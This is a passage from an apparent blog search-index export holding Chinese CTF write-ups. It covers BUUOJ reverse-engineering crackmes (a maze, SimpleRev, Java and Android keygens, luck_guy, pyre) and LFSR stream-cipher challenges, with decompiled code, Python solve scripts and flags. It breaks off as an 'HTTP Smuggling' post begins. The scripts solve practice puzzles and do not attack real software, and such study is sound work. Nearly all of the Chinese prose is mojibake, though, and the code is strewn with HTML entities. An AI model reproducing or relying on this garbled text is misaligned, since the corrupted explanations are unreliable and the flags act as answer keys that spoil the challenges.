v5ä½¿ç”¨è¿ç»­çš„å†…å­˜ç©ºé—´, ç›®æµ‹æ˜¯æ•°ç»„, æ‰€ä»¥*(&amp;v4 + i)å¯ä»¥æŒ‡å‘v5) 12345for ( i = 0; i &lt;= 1; ++i )&#123; if ( *(&amp;v4 + i) &lt; 0 || *(&amp;v4 + i) &gt; 4 ) exit(1);&#125; _data_start__=&quot;*11110100001010000101111#&quot; ä¸”è¯¥å€¼è¢«èµ‹ç»™v3, v3ä¸ºå­—ç¬¦æ•°ç»„ä¸”å¼€å§‹å†…å­˜ä¸º[esp+17h] å½“v4 v5ä¸º0æ—¶, *((_BYTE *)&amp;v8 + 5 * v4 + v5 - 41)æŒ‡å‘åœ°å€ä¸º[esp+17h], å³v3çš„å¼€å§‹å†…å­˜ åˆ™é€šè¿‡v4ä¸v5çš„å€¼å¯ä»¥æ§åˆ¶å†…å­˜çš„æŒ‡å‘, å¯ä»¥ç”»å‡ºè¿·å®«åœ°å›¾ 1234567maze = &quot;&quot;&quot;* 1 1 1 10 1 0 0 00 1 0 1 00 0 0 1 01 1 1 1 #&quot;&quot;&quot; å½“*((_BYTE *)&amp;v8 + 5 * v4 + v5 - 41)æŒ‡å‘çš„å€¼ä¸º'1'(49)æ—¶, ç¨‹åºé€€å‡º å½“*((_BYTE *)&amp;v8 + 5 * v4 + v5 - 41)æŒ‡å‘çš„å€¼ä¸º'#'(35)æ—¶, åˆ™èµ°å‡ºè¿·å®« åˆ™å¯ä»¥å¾—å‡ºflag flag{222441144222} SimpleRev é“¾æ¥: https://buuoj.cn/challenges#SimpleRev ELF 64 IDAä¸­ main å‡½æ•°åç¼–è¯‘ç»“æœå¦‚ä¸‹ 12345678910111213141516171819202122int __cdecl __noreturn main(int argc, const char **argv, const char **envp)&#123; int v3; // eax char v4; // [rsp+Fh] [rbp-1h] while ( 1 ) &#123; while ( 1 ) &#123; printf(&quot;Welcome to CTF game!\\nPlease input d/D to start or input q/Q to quit this program: &quot;, argv, envp); v4 = getchar(); if ( v4 != 100 &amp;&amp; v4 != 68 ) break; Decry(); &#125; if ( v4 == 113 || v4 == 81 ) Exit(); puts(&quot;Input fault format!&quot;); v3 = getchar(); putchar(v3); &#125;&#125; è·Ÿè¿› Decry å‡½æ•° 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667unsigned __int64 Decry()&#123; char v1; // [rsp+Fh] [rbp-51h] int v2; // [rsp+10h] [rbp-50h] int v3; // [rsp+14h] [rbp-4Ch] int i; // [rsp+18h] [rbp-48h] int v5; // [rsp+1Ch] [rbp-44h] char src[8]; // [rsp+20h] [rbp-40h] __int64 v7; // [rsp+28h] [rbp-38h] int v8; // [rsp+30h] [rbp-30h] __int64 v9; // [rsp+40h] [rbp-20h] __int64 v10; // [rsp+48h] [rbp-18h] int v11; // [rsp+50h] [rbp-10h] unsigned __int64 v12; // [rsp+58h] [rbp-8h] v12 = __readfsqword(0x28u); *(_QWORD *)src = 357761762382LL; // &quot;NDCLS&quot; v7 = 0LL; v8 = 0; v9 = 512969957736LL; // &quot;hadow&quot; v10 = 0LL; v11 = 0; text = (char *)join(key3, &amp;v9); // key3=&quot;killshadow&quot; strcpy(key, key1); // key1=&quot;ADSFKNDCLS&quot; strcat(key, src); v2 = 0; v3 = 0; getchar(); v5 = strlen(key); for ( i = 0; i &lt; v5; ++i ) &#123; if ( key[v3 % v5] &gt; 64 &amp;&amp; key[v3 % v5] &lt;= 90 ) key[i] = key[v3 % v5] + 32; ++v3; &#125; printf(&quot;Please input your flag:&quot;, src); while ( 1 ) &#123; v1 = getchar(); if ( v1 == 10 ) break; if ( v1 == 32 ) &#123; ++v2; &#125; else &#123; if ( v1 &lt;= 96 || v1 &gt; 122 ) &#123; if ( v1 &gt; 64 &amp;&amp; v1 &lt;= 90 ) str2[v2] = (v1 - 39 - key[v3++ % v5] + 97) % 26 + 97; &#125; else &#123; str2[v2] = (v1 - 39 - key[v3++ % v5] + 97) % 26 + 97; &#125; if ( !(v3 % v5) ) putchar(32); ++v2; &#125; &#125; if ( !strcmp(text, str2) ) puts(&quot;Congratulation!\\n&quot;); else puts(&quot;Try again!\\n&quot;); return __readfsqword(0x28u) ^ v12;&#125; str2[v2] = (v1 - 39 - key[v3++ % v5] + 97) % 26 + 97 keyä¸str2çš„å€¼å·²çŸ¥, åˆ™å¯ä»¥çˆ†ç ´v1 1234567891011#!/usr/bin/env python3import stringstr2 = &quot;killshadow&quot;key = &quot;adsfkndcls&quot;flag = &quot;&quot;for _ in range(len(key)): for i in range(128): if ord(str2[_]) == (i-39-ord(key[_])+97)%26+97: if chr(i) in string.ascii_uppercase: flag += chr(i)print(flag) å®é™…çˆ†ç ´æ—¶, ä¼šå‡ºç°é™¤äº†å¤§å†™å­—æ¯ä¹‹å¤–çš„å…¶ä»–ç»“æœ, ä½†æ˜¯æœ¬é¢˜çš„flagä¸ºå¤§å†™å­—æ¯ flag{KLDQCUDFZO} Javaé€†å‘è§£å¯† é“¾æ¥: https://buuoj.cn/challenges#Javaé€†å‘è§£å¯† Java jd-guiä¸­åç¼–è¯‘ç»“æœå¦‚ä¸‹ 123456789101112131415161718192021222324252627282930313233343536import java.io.PrintStream;import java.util.ArrayList;import java.util.Scanner;public class Reverse&#123; public static void main(String[] args) &#123; Scanner s = new Scanner(System.in); System.out.println(&quot;Please input the flag ï¼š&quot;); String str = s.next(); System.out.println(&quot;Your input is ï¼š&quot;); System.out.println(str); char[] stringArr = str.toCharArray(); Encrypt(stringArr); &#125; public static void Encrypt(char[] arr) &#123; ArrayList Resultlist = new ArrayList(); for (int i = 0; i &lt; arr.length; ++i) &#123; int result = arr[i] + &#x27;@&#x27; ^ 0x20; Resultlist.add(Integer.valueOf(result)); &#125; int[] KEY = &#123; 180, 136, 137, 147, 191, 137, 147, 191, 148, 136, 133, 191, 134, 140, 129, 135, 191, 65 &#125;; ArrayList KEYList = new ArrayList(); for (int j = 0; j &lt; KEY.length; ++j) &#123; KEYList.add(Integer.valueOf(KEY[j])); &#125; System.out.println(&quot;Result:&quot;); if (Resultlist.equals(KEYList)) System.out.println(&quot;Congratulationsï¼&quot;); else System.err.println(&quot;Errorï¼&quot;); &#125;&#125; 123456#!/usr/bin/env python3key = [180, 136, 137, 147, 191, 137, 147, 191, 148, 136, 133, 191, 134, 140, 129, 135, 191, 65]flag = &quot;&quot;for i in range(len(key)): flag += chr((key[i]-ord(&#x27;@&#x27;))^0x20)print(flag) flag{This_is_the_flag_!} åˆ®å¼€æœ‰å¥– é“¾æ¥: https://buuoj.cn/challenges#åˆ®å¼€æœ‰å¥– EXE 32 IDAä¸­ DialogFunc å‡½æ•°åç¼–è¯‘ç»“æœå¦‚ä¸‹ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576BOOL __stdcall DialogFunc(HWND hDlg, UINT a2, WPARAM a3, LPARAM a4)&#123; const char *v4; // esi const char *v5; // edi int v7; // [esp+8h] [ebp-20030h] int v8; // [esp+Ch] [ebp-2002Ch] int v9; // [esp+10h] [ebp-20028h] int v10; // [esp+14h] [ebp-20024h] int v11; // [esp+18h] [ebp-20020h] int v12; // [esp+1Ch] [ebp-2001Ch] int v13; // [esp+20h] [ebp-20018h] int v14; // [esp+24h] [ebp-20014h] int v15; // [esp+28h] [ebp-20010h] int v16; // [esp+2Ch] [ebp-2000Ch] int v17; // [esp+30h] [ebp-20008h] CHAR String; // [esp+34h] [ebp-20004h] char v19; // [esp+35h] [ebp-20003h] char v20; // [esp+36h] [ebp-20002h] char v21; // [esp+37h] [ebp-20001h] char v22; // [esp+38h] [ebp-20000h] char v23; // [esp+39h] [ebp-1FFFFh] char v24; // [esp+3Ah] [ebp-1FFFEh] char v25; // [esp+3Bh] [ebp-1FFFDh] char v26; // [esp+10034h] [ebp-10004h] char v27; // [esp+10035h] [ebp-10003h] char v28; // [esp+10036h] [ebp-10002h] if ( a2 == 272 ) return 1; if ( a2 != 273 ) return 0; if ( (_WORD)a3 == 1001 ) &#123; memset(&amp;String, 0, 0xFFFFu); GetDlgItemTextA(hDlg, 1000, &amp;String, 0xFFFF); if ( strlen(&amp;String) == 8 ) &#123; v7 = 90; v8 = 74; v9 = 83; v10 = 69; v11 = 67; v12 = 97; v13 = 78; v14 = 72; v15 = 51; v16 = 110; v17 = 103; sub_4010F0(&amp;v7, 0, 10); memset(&amp;v26, 0, 0xFFFFu); v26 = v23; v28 = v25; v27 = v24; v4 = (const char *)sub_401000(&amp;v26, strlen(&amp;v26)); memset(&amp;v26, 0, 0xFFFFu); v27 = v21; v26 = v20; v28 = v22; v5 = (const char *)sub_401000(&amp;v26, strlen(&amp;v26)); if ( String == v7 + 34 &amp;&amp; v19 == v11 &amp;&amp; 4 * v20 - 141 == 3 * v9 &amp;&amp; v21 / 4 == 2 * (v14 / 9) &amp;&amp; !strcmp(v4, &quot;ak1w&quot;) &amp;&amp; !strcmp(v5, &quot;V1Ax&quot;) ) &#123; MessageBoxA(hDlg, &quot;U g3t 1T!&quot;, &quot;@_@&quot;, 0); &#125; &#125; return 0; &#125; if ( (_WORD)a3 != 1 &amp;&amp; (_WORD)a3 != 2 ) return 0; EndDialog(hDlg, (unsigned __int16)a3); return 1;&#125; v7-v17ä¸ºæ•°ç»„, Stringåˆ°v25ä¸ºæ•°ç»„, v26åˆ°v28ä¸ºæ•°ç»„ 1int arr_1 = &#123;90, 74, 83, 69, 67, 97, 78, 72, 51, 110, 103&#125;; è·Ÿè¿› sub_4010F0 å‡½æ•° ä»£ç é€»è¾‘æœ‰äº›å¤æ‚, è¿™é‡Œå¯ä»¥åç¼–è¯‘ä»£ç ä¹‹åä¿®æ”¹æˆCè¯­è¨€ä»£ç å†è¿è¡Œ, å¾—å‡ºarr_1ç»è¿‡å‡½æ•°å¤„ç†çš„ç»“æœ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859#include &lt;stdio.h&gt;int sub_4010F0(int a1[], int a2, int a3)&#123; int result; // eax int i; // esi int v5; // ecx int v6; // edx result = a3; for ( i = a2; i &lt;= a3; a2 = i ) &#123; v5 = i; v6 = a1[i]; if ( a2 &lt; result &amp;&amp; i &lt; result ) &#123; do &#123; if ( v6 &gt; a1[result] ) &#123; if ( i &gt;= result ) break; ++i; a1[v5] = a1[result]; if ( i &gt;= result ) break; while ( a1[i] &lt;= v6 ) &#123; if ( ++i &gt;= result ) goto LABEL_13; &#125; if ( i &gt;= result ) break; v5 = i; a1[result] = a1[i]; &#125; --result; &#125; while ( i &lt; result ); &#125;LABEL_13: a1[result] = v6; sub_4010F0(a1, a2, i - 1); result = a3; ++i; &#125; return result;&#125;int main()&#123; int i; int arr_1[] = &#123;90, 74, 83, 69, 67, 97, 78, 72, 51, 110, 103&#125;; sub_4010F0(arr_1, 0, 10); for(i = 0; i &lt; 11; i++) &#123; printf(&quot;%d &quot;, arr_1[i]); &#125;&#125; å¾—åˆ°çš„ç»“æœä¸º 151 67 69 72 74 78 83 90 97 103 110 åç»­çš„ä»£ç ä¸­æœ‰å¯¹äºç”¨æˆ·è¾“å…¥çš„æ ¡éªŒ String == v7 + 34 v19 == v11 4 * v20 - 141 == 3 * v9 v21 / 4 == 2 * (v14 / 9) !strcmp(v4, &quot;ak1w&quot;) !strcmp(v5, &quot;V1Ax&quot;) å³ arr_2[0] == arr_1[0]+34, arr_2[0] == 85 arr_2[1] == arr_1[4], arr_2[1] == 74 arr_2[2] == (3*arr_1[2]+141)/4, arr_2[2] == 87 arr_2[3] == arr_1[7]/9*2*4, arr_2[3] == 80 å¾—å‡ºflagå‰å››ä½ä¸º&quot;UJWP&quot; sub_401000(arr_2[5:8]) == &quot;ak1w&quot; sub_401000(arr_2[2:5]) == &quot;V1Ax&quot; ç›®æµ‹æ˜¯Base64 12345echo -n &quot;ak1w&quot; | base64 -djMpecho -n &quot;V1Ax&quot; | base64 -dWP1 flag{UJWP1jMp} [GXYCTF2019]luck_guy é“¾æ¥: https://buuoj.cn/challenges#[GXYCTF2019]luck_guy EXE 64 IDAä¸­ get_flag å‡½æ•°åç¼–è¯‘ç»“æœå¦‚ä¸‹ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152unsigned __int64 get_flag()&#123; unsigned int v0; // eax char v1; // al signed int i; // [rsp+4h] [rbp-3Ch] signed int j; // [rsp+8h] [rbp-38h] unsigned __int64 s; // [rsp+10h] [rbp-30h] char v6; // [rsp+18h] [rbp-28h] unsigned __int64 v7; // [rsp+38h] [rbp-8h] v7 = __readfsqword(0x28u); v0 = time(0LL); srand(v0); for ( i = 0; i &lt;= 4; ++i ) &#123; switch ( rand() % 200 ) &#123; case 1: puts(&quot;OK, it&#x27;s flag:&quot;); memset(&amp;s, 0, 0x28uLL); strcat((char *)&amp;s, f1); strcat((char *)&amp;s, &amp;f2); printf(&quot;%s&quot;, &amp;s); break; case 2: printf(&quot;Solar not like you&quot;); break; case 3: printf(&quot;Solar want a girlfriend&quot;); break; case 4: v6 = 0; s = 0x7F666F6067756369LL; strcat(&amp;f2, (const char *)&amp;s); break; case 5: for ( j = 0; j &lt;= 7; ++j ) &#123; if ( j % 2 == 1 ) v1 = *(&amp;f2 + j) - 2; else v1 = *(&amp;f2 + j) - 1; *(&amp;f2 + j) = v1; &#125; break; default: puts(&quot;emmm,you can&#x27;t find flag 23333&quot;); break; &#125; &#125; return __readfsqword(0x28u) ^ v7;&#125; f2ä¸ºç©ºå­—ç¬¦ä¸², f1=&quot;GXY&#123;do_not_&quot; åœ¨case 4ä¸­å¯¹f2è¿›è¡Œæ‹¼æ¥å­—ç¬¦ä¸², æ‹¼æ¥å†…å®¹ä¸º0x7F666F6067756369LL(å°ç«¯æ’åº) åœ¨case 5ä¸­å¯¹f2è¿›è¡Œå¤„ç† åœ¨case 1ä¸­å°†f1, f2è¿›è¡Œæ‹¼æ¥å¹¶è¾“å‡ºflag 123456789#!/usr/bin/env python3flag = &quot;GXY&#123;do_not_&quot;f2 = [0x7F, 0x66, 0x6F, 0x60, 0x67, 0x75, 0x63, 0x69][::-1]for _ in range(len(f2)): if _ % 2 == 1: flag += chr(f2[_]-2); else: flag += chr(f2[_]-1);print(flag) flag{do_not_hate_me} findit é“¾æ¥: https://buuoj.cn/challenges#findit Android ä¿®æ”¹åç¼€åä¸ºzip, æå–classes.dex ä½¿ç”¨dex2jarè½¬ä¸ºjaråŒ… åœ¨jd-guiä¸­åç¼–è¯‘å¾—åˆ°javaä»£ç  1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677package com.example.findit;import android.os.Bundle;import android.support.v7.app.ActionBarActivity;import android.text.Editable;import android.view.MenuItem;import android.view.View;import android.view.View.OnClickListener;import android.widget.Button;import android.widget.EditText;import android.widget.TextView;public class MainActivity extends ActionBarActivity&#123; protected void onCreate(Bundle paramBundle) &#123; super.onCreate(paramBundle); setContentView(2130903064); paramBundle = (Button)findViewById(2131034173); EditText localEditText = (EditText)findViewById(2131034174); TextView localTextView = (TextView)findViewById(2131034175); paramBundle.setOnClickListener(new View.OnClickListener(new char[] &#123; 84, 104, 105, 115, 73, 115, 84, 104, 101, 70, 108, 97, 103, 72, 111, 109, 101 &#125;, localEditText, new char[] &#123; 112, 118, 107, 113, 123, 109, 49, 54, 52, 54, 55, 53, 50, 54, 50, 48, 51, 51, 108, 52, 109, 52, 57, 108, 110, 112, 55, 112, 57, 109, 110, 107, 50, 56, 107, 55, 53, 125 &#125;, localTextView) &#123; public void onClick(View paramView) &#123; paramView = new char[17]; char[] arrayOfChar = new char[38]; int i = 0; if (i &gt;= 17) &#123; label12: if (!(String.valueOf(paramView).equals(this.val$edit.getText().toString()))) break label308; i = 0; if (i &gt;= 38) &#123; label42: paramView = String.valueOf(arrayOfChar); this.val$text.setText(paramView); return; &#125; &#125; else &#123; if (((this.val$a[i] &lt; &#x27;I&#x27;) &amp;&amp; (this.val$a[i] &gt;= &#x27;A&#x27;)) || ((this.val$a[i] &lt; &#x27;i&#x27;) &amp;&amp; (this.val$a[i] &gt;= &#x27;a&#x27;))) paramView[i] = (char)(this.val$a[i] + &#x27;\\18&#x27;); while (true) &#123; i += 1; break label12: if (((this.val$a[i] &gt;= &#x27;A&#x27;) &amp;&amp; (this.val$a[i] &lt;= &#x27;Z&#x27;)) || ((this.val$a[i] &gt;= &#x27;a&#x27;) &amp;&amp; (this.val$a[i] &lt;= &#x27;z&#x27;))) paramView[i] = (char)(this.val$a[i] - &#x27;\\b&#x27;); paramView[i] = this.val$a[i]; &#125; &#125; if (((this.val$b[i] &gt;= &#x27;A&#x27;) &amp;&amp; (this.val$b[i] &lt;= &#x27;Z&#x27;)) || ((this.val$b[i] &gt;= &#x27;a&#x27;) &amp;&amp; (this.val$b[i] &lt;= &#x27;z&#x27;))) &#123; arrayOfChar[i] = (char)(this.val$b[i] + &#x27;\\16&#x27;); if (((arrayOfChar[i] &gt; &#x27;Z&#x27;) &amp;&amp; (arrayOfChar[i] &lt; &#x27;a&#x27;)) || (arrayOfChar[i] &gt;= &#x27;z&#x27;)) arrayOfChar[i] = (char)(arrayOfChar[i] - &#x27;\\26&#x27;); &#125; while (true) &#123; i += 1; break label42: arrayOfChar[i] = this.val$b[i]; &#125; label308: this.val$text.setText(&quot;ç­”æ¡ˆé”™äº†è‚¿ä¹ˆåŠã€‚ã€‚ã€‚ä¸ç»™ä½ åˆä¸å¥½æ„æ€ã€‚ã€‚ã€‚å“å‘€å¥½çº ç»“å•Š~~~&quot;); &#125; &#125;); &#125; public boolean onOptionsItemSelected(MenuItem paramMenuItem) &#123; if (paramMenuItem.getItemId() == 2131034176) return true; return super.onOptionsItemSelected(paramMenuItem); &#125;&#125; ç¬¬ä¸€ä¸ªå­—ç¬¦ä¸²å†…å®¹ä¸º&quot;ThisIsTheFlagHome&quot; ç¬¬äºŒä¸ªå­—ç¬¦ä¸²å†…å®¹ä¸º&quot;pvkq{m164675262033l4m49lnp7p9mnk28k75}&quot; ç›®æµ‹æ˜¯å‡¯æ’’åŠ å¯†, çˆ†ç ´å³å¯å¾—åˆ°flag flag{c164675262033b4c49bdf7f9cda28a75} ç®€å•æ³¨å†Œå™¨ é“¾æ¥: https://buuoj.cn/challenges#ç®€å•æ³¨å†Œå™¨ Android 123456789101112131415161718192021222324252627282930public void onClick(View paramView)&#123; int j = 1; paramView = this.val$editview.getText().toString(); if ((paramView.length() != 32) || (paramView.charAt(31) != &#x27;a&#x27;) || (paramView.charAt(1) != &#x27;b&#x27;) || (paramView.charAt(0) + paramView.charAt(2) - 48 != 56)) j = 0; if (j == 1) &#123; paramView = &quot;dd2940c04462b4dd7c450528835cca15&quot;.toCharArray(); paramView[2] = (char)(paramView[2] + paramView[3] - 50); paramView[4] = (char)(paramView[2] + paramView[5] - 48); paramView[30] = (char)(paramView[31] + paramView[9] - 48); paramView[14] = (char)(paramView[27] + paramView[28] - 97); j = 0; while (true) &#123; if (j &gt;= 16) &#123; paramView = String.valueOf(paramView); this.val$textview.setText(&quot;flag&#123;&quot; + paramView + &quot;&#125;&quot;); return; &#125; int i = paramView[(31 - j)]; paramView[(31 - j)] = paramView[j]; paramView[j] = i; j += 1; &#125; &#125; this.val$textview.setText(&quot;è¾“å…¥æ³¨å†Œç é”™è¯¯&quot;);&#125; 1234567891011121314151617#!/usr/bin/env python3cipher = []for _ in &quot;dd2940c04462b4dd7c450528835cca15&quot;: cipher.append(_)cipher[2] = chr(ord(cipher[2])+ord(cipher[3])-50)cipher[4] = chr(ord(cipher[2])+ord(cipher[5])-48)cipher[30] = chr(ord(cipher[31])+ord(cipher[9])-48)cipher[14] = chr(ord(cipher[27])+ord(cipher[28])-97)for j in range(16): i = cipher[(31-j)] cipher[(31-j)] = cipher[j] cipher[j] = iflag = &quot;flag&#123;&quot;for _ in cipher: flag += _flag += &quot;&#125;&quot;print(flag) flag{59acc538825054c7de4b26440c0999dd} [GWCTF 2019]pyre é“¾æ¥: https://buuoj.cn/challenges#[GWCTF 2019]pyre Python ä½¿ç”¨uncompyle6åç¼–è¯‘pycæ–‡ä»¶å¾—åˆ°æºä»£ç  123456789101112print &#x27;Welcome to Re World!&#x27;print &#x27;Your input1 is your flag~&#x27;l = len(input1)for i in range(l): num = ((input1[i] + i) % 128 + 128) % 128 code += numfor i in range(l - 1): code[i] = code[i] ^ code[(i + 1)]print codecode = [&#x27;\\x1f&#x27;, &#x27;\\x12&#x27;, &#x27;\\x1d&#x27;, &#x27;(&#x27;, &#x27;0&#x27;, &#x27;4&#x27;, &#x27;\\x01&#x27;, &#x27;\\x06&#x27;, &#x27;\\x14&#x27;, &#x27;4&#x27;, &#x27;,&#x27;, &#x27;\\x1b&#x27;, &#x27;U&#x27;, &#x27;?&#x27;, &#x27;o&#x27;, &#x27;6&#x27;, &#x27;*&#x27;, &#x27;:&#x27;, &#x27;\\x01&#x27;, &#x27;D&#x27;, &#x27;;&#x27;, &#x27;%&#x27;, &#x27;\\x13&#x27;] 12345678910111213#!/usr/bin/env python3cipher = [&#x27;\\x1f&#x27;, &#x27;\\x12&#x27;, &#x27;\\x1d&#x27;, &#x27;(&#x27;, &#x27;0&#x27;, &#x27;4&#x27;, &#x27;\\x01&#x27;, &#x27;\\x06&#x27;, &#x27;\\x14&#x27;, &#x27;4&#x27;, &#x27;,&#x27;, &#x27;\\x1b&#x27;, &#x27;U&#x27;, &#x27;?&#x27;, &#x27;o&#x27;, &#x27;6&#x27;, &#x27;*&#x27;, &#x27;:&#x27;, &#x27;\\x01&#x27;, &#x27;D&#x27;, &#x27;;&#x27;, &#x27;%&#x27;, &#x27;\\x13&#x27;]l = len(cipher)for _ in range(l): cipher[_] = ord(cipher[_])for _ in range(l-2, -1, -1): cipher[_] = cipher[_]^cipher[_+1]for _ in range(l): cipher[_] = (cipher[_]-_)%128flag = &quot;&quot;for _ in cipher: flag += chr(_)print(flag) flag{Just_Re_1s_Ha66y!} EOF","categories":[{"name":"Study","slug":"Study","permalink":"https://yoloyolo.top/categories/Study/"}],"tags":[{"name":"Reverse","slug":"Reverse","permalink":"https://yoloyolo.top/tags/Reverse/"}]},{"title":"Crypto-LFSR","slug":"Crypto-LFSR","date":"2021-04-02T05:17:09.000Z","updated":"2021-04-02T15:06:07.000Z","comments":true,"path":"2021/04/02/Crypto-LFSR/","link":"","permalink":"https://yoloyolo.top/2021/04/02/Crypto-LFSR/","excerpt":"Stream Cipher LFSR","text":"Stream Cipher LFSR [2018å¼ºç½‘æ¯]Streamgame1 12345678910111213141516171819202122232425262728from flag import flagassert flag.startswith(&quot;flag&#123;&quot;)assert flag.endswith(&quot;&#125;&quot;)assert len(flag)==25def lfsr(R,mask): output = (R &lt;&lt; 1) &amp; 0xffffff i=(R&amp;mask)&amp;0xffffff lastbit=0 while i!=0: lastbit^=(i&amp;1) i=i&gt;&gt;1 output^=lastbit return (output,lastbit)R=int(flag[5:-1],2)mask = 0b1010011000100011100f=open(&quot;key&quot;,&quot;ab&quot;)for i in range(12): tmp=0 for j in range(8): (R,out)=lfsr(R,mask) tmp=(tmp &lt;&lt; 1)^out f.write(chr(tmp))f.close() 1234hexdump -C key 00000000 55 38 f7 42 c1 0d b2 c7 ed e0 24 3a |U8.B......$:|0000000c åŠ å¯†æµç¨‹ åºåˆ—å·¦ç§»ä¸€ä½ ä¸åé¦ˆç³»æ•°è¿›è¡Œä¸”è¿ç®— è¿ç®—ç»“æœè¿›è¡Œå¼‚æˆ–å¾—åˆ°ç»“æœ ç»“æœä½œä¸ºåºåˆ—çš„ç»“å°¾ result=cn&amp;anâŠ•...âŠ•c2&amp;a2âŠ•c1&amp;a1result = c_n\\&amp;a_n \\oplus ... \\oplus c_2\\&amp;a_2 \\oplus c_1\\&amp;a_1result=cnâ€‹&amp;anâ€‹âŠ•...âŠ•c2â€‹&amp;a2â€‹âŠ•c1â€‹&amp;a1â€‹ åé¦ˆç³»æ•°ä¸º mask = 0b1010011000100011100 å³ c19,c17,c14,c13,c9,c5,c4,c3=1c_{19}, c_{17}, c_{14}, c_{13}, c_9, c_5, c_4, c_3 = 1c19â€‹,c17â€‹,c14â€‹,c13â€‹,c9â€‹,c5â€‹,c4â€‹,c3â€‹=1 (ä»å³åˆ°å·¦) é‚£ä¹ˆåé¦ˆè¿ç®—ä¸º result=a19âŠ•a17âŠ•a14âŠ•a13âŠ•a9âŠ•a5âŠ•a4âŠ•a3result = a_{19} \\oplus a_{17} \\oplus a_{14} \\oplus a_{13} \\oplus a_9 \\oplus a_5 \\oplus a_4 \\oplus a_3result=a19â€‹âŠ•a17â€‹âŠ•a14â€‹âŠ•a13â€‹âŠ•a9â€‹âŠ•a5â€‹âŠ•a4â€‹âŠ•a3â€‹ è€Œä¸”æˆ‘ä»¬å·²çŸ¥a1-a18ä»¥åŠäº§ç”Ÿçš„result é‚£ä¹ˆå°±å¯ä»¥æ ¹æ®è¿™äº›æ¡ä»¶æ¥å¾—å‡ºa19 a19=resultâŠ•a17âŠ•a14âŠ•a13âŠ•a9âŠ•a5âŠ•a4âŠ•a3a_{19} = result \\oplus a_{17} \\oplus a_{14} \\oplus a_{13} \\oplus a_9 \\oplus a_5 \\oplus a_4 \\oplus a_3a19â€‹=resultâŠ•a17â€‹âŠ•a14â€‹âŠ•a13â€‹âŠ•a9â€‹âŠ•a5â€‹âŠ•a4â€‹âŠ•a3â€‹ ä»¥æ­¤ç±»æ¨ï¼Œæ¥æ¢å¤flag 123456789101112131415161718f = open(&quot;key&quot;, &quot;rb&quot;)bytes = f.read(3)f.close()key = &quot;&quot;for i in bytes: if len(bin(i)[2:]) != 8: key += (8 - len(bin(i)[2:])) * &quot;0&quot; + bin(i)[2:] else: key += bin(i)[2:]key = key[:19]print(key)flag = &quot;&quot;for i in range(19): res = key[-1] key = key[:18] awns = chr(int(res) ^ int(key[-3]) ^ int(key[-4]) ^ int(key[-5]) ^ int(key[-9]) ^ int(key[-13]) ^ int(key[-14]) ^ int(key[-17]) + 48) key = awns + keyprint(&quot;flag&#123;&quot; + key + &quot;&#125;&quot;) [2018å¼ºç½‘æ¯]Streamgame2 12345678910111213141516171819202122232425262728from flag import flagassert flag.startswith(&quot;flag&#123;&quot;)assert flag.endswith(&quot;&#125;&quot;)assert len(flag)==27def lfsr(R,mask): output = (R &lt;&lt; 1) &amp; 0xffffff i=(R&amp;mask)&amp;0xffffff lastbit=0 while i!=0: lastbit^=(i&amp;1) i=i&gt;&gt;1 output^=lastbit return (output,lastbit)R=int(flag[5:-1],2)mask=0x100002f=open(&quot;key&quot;,&quot;ab&quot;)for i in range(12): tmp=0 for j in range(8): (R,out)=lfsr(R,mask) tmp=(tmp &lt;&lt; 1)^out f.write(chr(tmp))f.close() è·Ÿä¸Šä¸€é¢˜ä¸€ä¸ªæ€è·¯ï¼Œè€Œä¸”æ›´ç®€å•ï¼ˆç§»ä½å¯„å­˜å™¨æ›´å°‘ï¼‰ 1234567891011121314151617181920#!/usr/bin/env python3#coding:utf-8f = open(&quot;key&quot;, &quot;rb&quot;)bytes = f.read(3)f.close()key = &quot;&quot;for i in bytes: if len(bin(i)[2:]) != 8: key += (8 - len(bin(i)[2:])) * &quot;0&quot; + bin(i)[2:] else: key += bin(i)[2:]key = key[:21]flag = &quot;&quot;for i in range(21): res = key[-1] key = key[:20] awns = chr(int(res) ^ int(key[-2]) + 48) key = awns + keyprint(&quot;flag&#123;&quot; + key + &quot;&#125;&quot;) [CISCN2018]oldstreamgame çªç„¶å‘ç°éƒ½æ˜¯ä¸€ä¸ªå¥—è·¯ 1234567891011121314151617181920212223242526flag = &quot;flag&#123;xxxxxxxxxxxxxxxx&#125;&quot;assert flag.startswith(&quot;flag&#123;&quot;)assert flag.endswith(&quot;&#125;&quot;)assert len(flag)==14def lfsr(R,mask): output = (R &lt;&lt; 1) &amp; 0xffffffff i=(R&amp;mask)&amp;0xffffffff lastbit=0 while i!=0: lastbit^=(i&amp;1) i=i&gt;&gt;1 output^=lastbit return (output,lastbit)R=int(flag[5:-1],16)mask = 0b10100100000010000000100010010100f=open(&quot;key&quot;,&quot;w&quot;)for i in range(100): tmp=0 for j in range(8): (R,out)=lfsr(R,mask) tmp=(tmp &lt;&lt; 1)^out f.write(chr(tmp))f.close() 12345678910111213141516171819#!/usr/bin/env python3#coding:utf-8f = open(&quot;key&quot;, &quot;rb&quot;)bytes = f.read(4)f.close()key = &quot;&quot;for i in bytes: if len(bin(i)[2:]) != 8: key += (8 - len(bin(i)[2:])) * &quot;0&quot; + bin(i)[2:] else: key += bin(i)[2:]print(key)for i in range(32): res = key[-1] key = key[:31] awns = chr(int(res) ^ int(key[-30]) ^ int(key[-27]) ^ int(key[-20]) ^ int(key[-12]) ^ int(key[-8]) ^ int(key[-5]) ^ int(key[-3]) + 48) key = awns + keyprint(&quot;flag&#123;&quot; + hex(int(key,2)) + &quot;&#125;&quot;) TBC","categories":[{"name":"Study","slug":"Study","permalink":"https://yoloyolo.top/categories/Study/"}],"tags":[{"name":"Crypto","slug":"Crypto","permalink":"https://yoloyolo.top/tags/Crypto/"},{"name":"LFSR","slug":"LFSR","permalink":"https://yoloyolo.top/tags/LFSR/"}]},{"title":"HTTP Smuggling","slug":"HTTP-Smuggling","date":"2021-03-19T23:59:31.000Z","updated":"2021-03-26T06:09:44.000Z","comments":true,"path":"2021/03/19/HTTP-Smuggling/","link":"","permalink":"https://yoloyolo.top/2021/03/19/HTTP-Smuggling/","excerpt":"å‰åç«¯æœåŠ¡å™¨å¯¹äºHTTPè¯·æ±‚å¤„ç†çš„å·®å¼‚é€ 